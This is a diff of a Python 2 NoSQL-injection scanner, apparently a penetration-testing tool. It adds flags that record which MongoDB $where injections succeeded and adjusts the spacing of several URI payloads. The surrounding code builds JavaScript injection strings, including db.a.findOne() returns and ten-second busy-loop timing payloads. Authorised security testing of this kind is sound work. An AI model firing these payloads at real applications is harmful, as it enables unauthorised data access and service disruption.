@@ -180,7 +180,7 @@ def webApps():
 	paramValue = []
 	vulnAddrs = []
 	possAddrs = []
-	testResults = []
+	testResults = [False,False,False,False,False,False,False,False,False,False,False]
 	appUp = False
 	strTbAttack = False
 	intTbAttack = False
@@ -241,6 +241,7 @@ def webApps():
 
 		if (randInjDelta >= 100) and (injLen != 0) :
 			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
+			testResults[0] = True
 			vulnAddrs.append(neqUri)
 
 		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
@@ -261,6 +262,7 @@ def webApps():
 
 		if (whereStrDelta >= 100) and (whereStrLen > 0):
 			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
+			testResults[1] = True
 			vulnAddrs.append(whereStrUri)
 
 		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
@@ -283,6 +285,7 @@ def webApps():
 
 		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
+			testResults[2] = True
 			vulnAddrs.append(whereIntUri)
 
 		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
@@ -307,6 +310,7 @@ def webApps():
 
 		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
+			testResults[3] = True
 			vulnAddrs.append(whereOneStr)
 
 		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
@@ -330,6 +334,7 @@ def webApps():
 
 		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
+			testResults[4] = True
 			vulnAddrs.append(whereOneInt)
 
 		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
@@ -352,6 +357,7 @@ def webApps():
 
 		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
 			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			testResults[5] = True
 			vulnAddrs.append(strThisNeqUri)
 
 		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
@@ -374,6 +380,7 @@ def webApps():
 
 		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
 			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			testResults[6] = True
 			vulnAddrs.append(intThisNeqUri)
 
 		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
@@ -567,10 +574,10 @@ def buildUri(origUri, randValue):
 			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
 			timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 			timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
-			strThisNeqUri += paramName[x] + "=a'; return this." + fakeColl +  "!= '" + randValue + "'; var dummy='!" + "&"
-			intThisNeqUri += paramName[x] + "=1; return this." + fakeColl + "!=" + randValue + "; var dummy=1" + "&"
-			strNullUri += paramName[x] + "=a'; return this." + fakeColl + "=null; var dummy='!" + "&"
-			intNullUri += paramName[x] + "=1; return this." +fakeColl + "=null; var dummy=1" + "&"
+			strThisNeqUri += paramName[x] + "=a'; return this." + fakeColl +  " != '" + randValue + "'; var dummy='!" + "&"
+			intThisNeqUri += paramName[x] + "=1; return this." + fakeColl + " !=" + randValue + "; var dummy=1" + "&"
+			strNullUri += paramName[x] + "=a'; return this." + fakeColl + " = null; var dummy='!" + "&"
+			intNullUri += paramName[x] + "=1; return this." +fakeColl + " = null; var dummy=1" + "&"
 
 		else:
 			evilUri += paramName[x] + "=" + paramValue[x] + "&"
